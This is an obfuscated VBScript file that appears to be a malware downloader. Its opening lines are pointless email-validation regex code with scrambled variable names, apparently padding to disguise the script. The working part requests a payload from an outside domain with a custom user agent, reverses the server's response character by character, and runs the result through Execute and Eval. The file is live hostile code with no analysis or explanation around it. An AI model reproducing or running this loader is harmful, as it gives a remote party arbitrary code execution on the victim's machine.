BtF81KE = "BQjO4apJsKw7wqYWptcdmJTLS" & "@" & "BQjO4apJsKw7wqYWptcdmJTLS" & "." & "BQjO4apJsKw7wqYWptcdmJTLS"

Set BtF81XY = New RegExp

With BtF81XY
    .Pattern    = "ˆ([\w-]+\.)*[\w-]+@([\w-]+\.)+[a-z]{2,4}$"
    .IgnoreCase = True
    .Global     = False
End With


BtF81XY.Pattern = "ˆ([\w-]+\.)*[\w-]+@([\w-]+)(\.[\w-]+)*\.[a-z]{2,4}$"

Set objMatch = BtF81XY.Execute( BtF81KE )

Set objMatch = Nothing

BtF81XY.Pattern = "@" & BtF81GH
BtF81WT  = "BQjO4apJsKw7wqYWptcdmJTLS"

BtF81CF = BtF81XY.Replace( BtF81KE, "@" & BtF81WT )

Set BtF81XY = Nothing

n8I70="BQjO4apJsKw7wqYWptcdmJTLS"
URL="http://desenvolveangar.info/?c=9f2&" & n8I70
set BtF81=CreateObject("Microsoft.XMLHTTP")

BtF81.open "GET",URL,false
BtF81.setRequestHeader "Content-Type", "application/x-www-form-urlencoded"
BtF81.setRequestHeader "User-Agent", "MITHRILX"
BtF81.send "Z"

dim NAyzE

function NAyzETT()
For i = Len(BtF81.responsetext) to 1  Step-1
var= Mid(BtF81.responsetext,  i  , 1)
NAyzE = NAyzE & var
Next
end function 

execute " Eval(""NAyzETT()"") : Execute NAyzE & n8I70BtF81 "
